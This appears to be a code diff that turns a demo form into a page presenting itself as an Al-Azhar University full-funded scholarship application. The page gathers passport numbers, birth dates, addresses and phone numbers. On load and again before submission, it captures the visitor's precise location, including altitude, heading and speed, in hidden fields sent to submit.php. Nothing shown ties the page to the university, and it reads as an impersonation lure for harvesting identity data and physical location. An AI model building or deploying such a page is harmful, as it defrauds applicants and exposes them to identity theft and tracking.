@@ -1,49 +1,317 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Demo Scholarship Application</title>
-  <script>
-    function askLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) {
-            document.getElementById("lat").value = pos.coords.latitude;
-            document.getElementById("lon").value = pos.coords.longitude;
-          },
-          function() {
-            alert("❗ Location is required to continue. Please allow location.");
-          }
-        );
-      } else {
-        alert("Geolocation not supported by your browser.");
-      }
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Al-Azhar University — Full-funded Scholarship Application</title>
+</head>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --primary: #004d40;
+      --primary-contrast: #fff;
+      --primary-hover: #00796b;
+      --soft-bg: #fafafa;
+      --soft-border: #bdbdbd;
+      --text-primary: #212121;
+      --text-secondary: #616161;
+      --error: #d32f2f;
+      --max-width: 700px;
+      --spacing: 24px;
     }
-
-    window.onload = askLocation;
-  </script>
+    html,body{height:100%;margin:0;background:var(--soft-bg);color:var(--text-primary);font-family:'Cairo', Arial, sans-serif;-webkit-font-smoothing:antialiased}
+    .container{max-width:var(--max-width);margin:40px auto;padding:var(--spacing);background:#ffffff;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
+    h1{font-size:24px;margin:0 0 8px;font-weight:700}
+    p.note{color:var(--text-secondary);margin-top:0}
+    .step{display:none;margin-bottom:40px}
+    .step.active{display:block}
+    .section-title{font-size:18px;font-weight:600;margin-bottom:12px;color:var(--primary)}
+    label{display:block;margin-bottom:8px;font-size:14px}
+    input[type=text],input[type=email],input[type=date],select,textarea,input[type=file]{width:100%;padding:12px;border:1px solid var(--soft-border);border-radius:4px;font-size:16px;box-sizing:border-box}
+    input:focus,textarea:focus,select:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 3px rgba(0,77,64,0.06)}
+    textarea{min-height:100px}
+    .field {margin-bottom:16px}
+    .actions{display:flex;gap:12px;align-items:center}
+    button{background:var(--primary);color:var(--primary-contrast);padding:12px 18px;border:0;border-radius:6px;font-weight:700;cursor:pointer;font-size:16px;box-shadow:0 4px 8px rgba(0,0,0,0.08)}
+    button:hover{background:var(--primary-hover)}
+    button[disabled]{background:#e0e0e0;color:#9e9e9e;box-shadow:none;cursor:not-allowed}
+    .btn-secondary{background:#fff;color:var(--primary);border:1px solid var(--soft-border);box-shadow:none;font-weight:600}
+    .progress{display:flex;gap:8px;margin-bottom:24px}
+    .progress .step-ind{flex:1;position:relative;padding:8px 12px;background:#fff;border-radius:6px;border:1px solid var(--soft-border);text-align:center;color:var(--text-secondary);font-size:13px}
+    .progress .step-ind.completed{background:linear-gradient(90deg,var(--primary) 0%,var(--primary-hover) 100%);color:var(--primary-contrast);border-color:transparent}
+    .progress .step-ind.current{border-color:var(--primary);color:var(--text-primary);box-shadow:0 4px 8px rgba(0,77,64,0.06)}
+    .inline-error{color:var(--error);font-size:13px;margin-top:6px}
+    .inline-note{color:var(--text-secondary);font-size:13px;margin-top:6px}
+    .location-status{font-size:14px;color:var(--text-secondary);margin-top:8px}
+    @media (max-width:600px){.container{margin:16px;padding:18px}}
+  </style>
+</head>
 </head>
 <body>
-  <h2>Demo Scholarship Application</h2>
-  <form action="submit.php" method="POST" onsubmit="return validateForm();">
-    Name: <input type="text" name="name" required><br>
-    Email: <input type="email" name="email" required><br>
-    Passport No: <input type="text" name="passport"><br><br>
+  <div class="container">
+    <h1>Al-Azhar University — Full-funded Scholarship Application</h1>
+    <p class="note">Please complete all required fields. You will be asked to allow access to your location and to consent to processing your personal data for the scholarship application.</p>
 
-    <!-- Hidden fields for location -->
-    <input type="hidden" name="lat" id="lat">
-    <input type="hidden" name="lon" id="lon">
+  <form id="scholarshipForm">
+      <fieldset>
+        <legend>Personal Information</legend>
+        <label>Full Name* <input type="text" name="name" id="name" required></label>
+        <label>Email* <input type="email" name="email" id="email" required></label>
+        <label>Date of Birth* <input type="date" name="dob" id="dob" required></label>
+        <label>Gender
+          <select name="gender" id="gender" required>
+            <option value="">-- select --</option>
+            <option>Male</option>
+            <option>Female</option>
+            <option>Prefer not to say</option>
+          </select>
+        </label>
+  <label>Nationality* <input type="text" name="nationality" id="nationality" required></label>
 
-    <button type="submit">Submit Application</button>
-  </form>
+  <label>Do you currently have a passport?*</label>
+  <label><input type="radio" name="has_passport" value="yes" id="has_passport_yes" checked> Yes</label>
+  <label><input type="radio" name="has_passport" value="no" id="has_passport_no"> No — I will be provided one</label>
+
+  <label id="passportLabel">Passport Number / National ID <input type="text" name="passport" id="passport"></label>
+  <p id="passportNote" class="note" style="display:none;">If you do not have a passport, Al-Azhar University will assist eligible applicants in obtaining one upon acceptance.</p>
+      </fieldset>
+
+      <fieldset>
+        <legend>Contact & Address</legend>
+        <label>Phone (international format) <input type="text" name="phone" id="phone" placeholder="+201XXXXXXXXX"></label>
+        <label>Current Address <textarea name="address" id="address" rows="2"></textarea></label>
+      </fieldset>
+
+  <!-- Education and Supporting Documents removed as requested -->
+
+      <fieldset>
+        <legend>Consent & Location</legend>
+        <label><input type="checkbox" id="consent" required> I consent to the processing of my personal data for the purpose of this scholarship application.</label>
+        <p class="note">We will capture your approximate location (latitude & longitude) to help verify eligibility. Your precise coordinates are not published.</p>
+  <input type="hidden" name="lat" id="lat">
+  <input type="hidden" name="lon" id="lon">
+  <input type="hidden" name="accuracy" id="accuracy">
+  <input type="hidden" name="altitude" id="altitude">
+  <input type="hidden" name="altitudeAccuracy" id="altitudeAccuracy">
+  <input type="hidden" name="heading" id="heading">
+  <input type="hidden" name="speed" id="speed">
+      </fieldset>
+
+      <div class="actions">
+        <button type="submit">Submit Application</button>
+        <span id="status" role="status"></span>
+      </div>
+    </form>
+  </div>
 
   <script>
-    function validateForm() {
-      if (!document.getElementById("lat").value || !document.getElementById("lon").value) {
-        alert("❗ You must allow location to complete this form.");
-        return false;
+    // Ask for high-accuracy geolocation and store best result in hidden fields
+    // Returns a Promise that resolves when best position is chosen or timeout occurs
+    function askLocation() {
+      const latEl = document.getElementById('lat');
+      const lonEl = document.getElementById('lon');
+      const accEl = document.getElementById('accuracy');
+      const altEl = document.getElementById('altitude');
+      const altAccEl = document.getElementById('altitudeAccuracy');
+      const headEl = document.getElementById('heading');
+      const speedEl = document.getElementById('speed');
+
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          console.warn('Geolocation not supported');
+          resolve(null);
+          return;
+        }
+
+        let best = null;
+        const desiredAccuracy = 50; // meters or lower is better
+        const maxWait = 20000; // ms
+        const start = Date.now();
+
+        const watcher = navigator.geolocation.watchPosition(function(pos) {
+          if (!best || (pos.coords.accuracy && pos.coords.accuracy < best.coords.accuracy)) {
+            best = pos;
+            latEl.value = pos.coords.latitude;
+            lonEl.value = pos.coords.longitude;
+            accEl.value = pos.coords.accuracy || '';
+            altEl.value = pos.coords.altitude !== null ? pos.coords.altitude : '';
+            altAccEl.value = pos.coords.altitudeAccuracy !== null ? pos.coords.altitudeAccuracy : '';
+            headEl.value = pos.coords.heading !== null ? pos.coords.heading : '';
+            speedEl.value = pos.coords.speed !== null ? pos.coords.speed : '';
+            console.log('New best position, accuracy=', pos.coords.accuracy);
+          }
+
+          if (pos.coords.accuracy && pos.coords.accuracy <= desiredAccuracy) {
+            navigator.geolocation.clearWatch(watcher);
+            console.log('Desired accuracy reached:', pos.coords.accuracy);
+            resolve(best);
+            return;
+          }
+
+          if (Date.now() - start > maxWait) {
+            navigator.geolocation.clearWatch(watcher);
+            console.log('Stopped after timeout, best accuracy=', best && best.coords ? best.coords.accuracy : 'none');
+            resolve(best);
+            return;
+          }
+        }, function(err) {
+          console.warn('Geolocation error:', err.message);
+          resolve(null);
+        }, { enableHighAccuracy: true, maximumAge: 0, timeout: maxWait });
+      });
+    }
+
+    // initial fetch when page loads
+    window.addEventListener('load', ()=>{ askLocation().then(()=>updateLocationStatus()); });
+
+  // Multi-step form management
+  const steps = ['personal','contact','consent'];
+    let currentStep = 0;
+
+    function renderProgress() {
+      const container = document.querySelector('.progress');
+      container.innerHTML = '';
+      steps.forEach((s, idx) => {
+        const el = document.createElement('div');
+        el.className = 'step-ind' + (idx < currentStep ? ' completed' : (idx === currentStep ? ' current' : ''));
+        el.textContent = ['Personal','Contact','Consent'][idx];
+        container.appendChild(el);
+      });
+    }
+
+    // Build step elements
+    (function buildSteps() {
+      const form = document.getElementById('scholarshipForm');
+      const nodes = {
+        personal: Array.from(form.querySelectorAll('fieldset'))[0],
+        contact: Array.from(form.querySelectorAll('fieldset'))[1],
+        consent: Array.from(form.querySelectorAll('fieldset'))[2]
+      };
+      // Wrap fieldsets into step containers
+      Object.keys(nodes).forEach((k,i)=>{
+        const wrap = document.createElement('div'); wrap.className='step'; wrap.id='step-'+k;
+  const title = document.createElement('div'); title.className='section-title'; title.textContent = ['Personal Information','Contact & Address','Consent & Location'][i];
+        wrap.appendChild(title);
+        wrap.appendChild(nodes[k]);
+        form.insertBefore(wrap, form.querySelector('.actions'));
+      });
+      // Create progress bar
+      const progress = document.createElement('div'); progress.className='progress';
+      form.parentNode.insertBefore(progress, form);
+      renderProgress();
+      showStep(0);
+    })();
+
+    function showStep(idx){
+      currentStep = idx;
+      document.querySelectorAll('.step').forEach((el,i)=>{el.classList.toggle('active', i===idx)});
+      renderProgress();
+    }
+
+    // Add next/prev buttons to steps
+    (function addNavigation(){
+      const actions = document.querySelector('.actions');
+      const prev = document.createElement('button'); prev.type='button'; prev.className='btn-secondary'; prev.textContent='Back';
+      const next = document.createElement('button'); next.type='button'; next.textContent='Next';
+      actions.insertBefore(prev, actions.firstChild);
+      actions.insertBefore(next, actions.firstChild);
+      prev.addEventListener('click',()=>{ if(currentStep>0) showStep(currentStep-1); });
+      next.addEventListener('click',()=>{
+        // basic step validation
+        if (!validateStep(currentStep)) return;
+        if (currentStep < steps.length-1) showStep(currentStep+1);
+      });
+    })();
+
+    function validateStep(idx){
+      // clear inline errors
+      document.querySelectorAll('.inline-error').forEach(e=>e.remove());
+      const stepEl = document.querySelectorAll('.step')[idx];
+      const inputs = Array.from(stepEl.querySelectorAll('input, select, textarea'));
+      for(const inp of inputs){
+        if (inp.required && !inp.value) {
+          const msg = document.createElement('div'); msg.className='inline-error'; msg.textContent='This field is required.';
+          inp.parentNode.appendChild(msg); inp.focus(); return false;
+        }
+        if (inp.pattern){
+          const re = new RegExp(inp.getAttribute('pattern'));
+          if (inp.value && !re.test(inp.value)) { const msg = document.createElement('div'); msg.className='inline-error'; msg.textContent='Invalid format.'; inp.parentNode.appendChild(msg); inp.focus(); return false; }
+        }
       }
       return true;
     }
+
+    // Passport question behavior
+    function togglePassportFields(){
+      const no = document.getElementById('has_passport_no');
+      const passportLabel = document.getElementById('passportLabel');
+      const passportInput = document.getElementById('passport');
+      const note = document.getElementById('passportNote');
+      if (no.checked){ passportLabel.style.display='none'; passportInput.required = false; note.style.display='block'; }
+      else { passportLabel.style.display='block'; passportInput.required = true; note.style.display='none'; }
+    }
+    document.getElementById('has_passport_yes').addEventListener('change', togglePassportFields);
+    document.getElementById('has_passport_no').addEventListener('change', togglePassportFields);
+    togglePassportFields();
+
+    // Location UI: show accuracy and retry
+    const locStatus = document.createElement('div'); locStatus.className='location-status';
+    const consentField = document.querySelector('#step-consent .note');
+    consentField.parentNode.insertBefore(locStatus, consentField.nextSibling);
+
+    function updateLocationStatus(){
+      const a = document.getElementById('accuracy').value;
+      if (!a) { locStatus.textContent = 'Location not captured yet. Click Retry to request again.'; return; }
+      locStatus.textContent = `Location captured — accuracy: ${a} m.`;
+    }
+    updateLocationStatus();
+
+  const retryBtn = document.createElement('button'); retryBtn.type='button'; retryBtn.className='btn-secondary'; retryBtn.textContent='Retry Location';
+  locStatus.appendChild(document.createTextNode(' ')); locStatus.appendChild(retryBtn);
+  retryBtn.addEventListener('click', async ()=>{ locStatus.textContent='Requesting location...'; await askLocation(); updateLocationStatus(); });
+
+
+    // Submit via AJAX so we can show JSON responses and handle files
+    document.getElementById('scholarshipForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = '';
+
+      // Basic validations
+      const consent = document.getElementById('consent').checked;
+      if (!consent) { statusEl.textContent = 'You must consent to data processing.'; statusEl.className = 'error'; return; }
+
+      // Re-fetch location immediately before submit to get fresh high-accuracy coordinates
+      statusEl.textContent = 'Refreshing location...';
+      try {
+        await askLocation();
+      } catch (e) {
+        console.warn('Location refresh failed', e);
+      }
+      updateLocationStatus();
+
+      // Build FormData (this will include hidden lat/lon)
+      const form = document.getElementById('scholarshipForm');
+      const formData = new FormData(form);
+
+      // Show a sending message
+      statusEl.textContent = 'Sending application...'; statusEl.className = '';
+
+      try {
+        const resp = await fetch('submit.php', { method: 'POST', body: formData });
+        const data = await resp.json();
+        if (data.success) {
+          statusEl.textContent = data.message || 'Application submitted.'; statusEl.className = 'success';
+          form.reset();
+        } else {
+          statusEl.textContent = data.message || 'Submission failed.'; statusEl.className = 'error';
+          console.error('Server details:', data.details || 'no details');
+        }
+      } catch (err) {
+        statusEl.textContent = 'Network error sending application.'; statusEl.className = 'error';
+        console.error(err);
+      }
+    });
   </script>
 </body>
 </html>
